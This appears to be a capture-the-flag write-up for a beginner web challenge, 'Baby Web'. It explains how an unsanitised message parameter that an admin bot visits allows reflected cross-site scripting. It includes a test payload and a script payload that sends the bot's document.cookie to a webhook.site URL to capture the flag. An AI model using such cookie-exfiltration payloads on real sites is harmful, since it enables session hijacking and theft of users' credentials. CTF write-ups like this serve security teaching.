## Baby Web

[dist.zip](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/baby-web/dist.zip)

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/baby-web/chall.png)

> The site has an input field where I can type text such as "hello"

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/baby-web/message.png)

> Note that the url parameter contains the message "hello" that we indicated. Analyze the source code to find out more.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == "GET":
        return render_template('index.html')

    message = request.form.get('message')
    if len(message) == 0:
        flash("Please enter a message")
        return render_template('index.html')

    link = f"/ticket?message={quote(message)}"

    # Admin vists the link here
    visit(BASE_URL, f"{BASE_URL}{link}")

    return redirect(link)
```

> We can see that the message parameter is not properly sanitized and thus is vulnerable to Cross-Site Scripting. We can verify this using thee standard payload `<script>alert(1)</script>`

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/baby-web/xss.png)

```python
def _visit(baseUrl:str, link: str) -> str:
    """Visit the website"""
    with webdriver.Chrome(ChromeDriverManager().install(), options=options) as driver:
        try:
            driver.get(f'{baseUrl}/')
            cookie = {"name": "flag", "value": COOKIE["flag"]}
            driver.add_cookie(cookie)
            driver.get(link)
            return f"Visited {link}"
        except:
            return f"Connection Error: {link}"
```
> From the above code, we know that the flag is stored in the cookie so we can use a webhook site to capture the cookie received. The payload is as follows:

```
<script>var i=new Image;i.src="https://webhook.site/3091ed00-b085-4cdf-9fd7-6b30093e707f?"+document.cookie;</script>
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Web%20Exploitation/Easy/baby-web/solved.png)

`grey{b4by_x55_347cbd01cbc74d13054b20f55ea6a42c}`
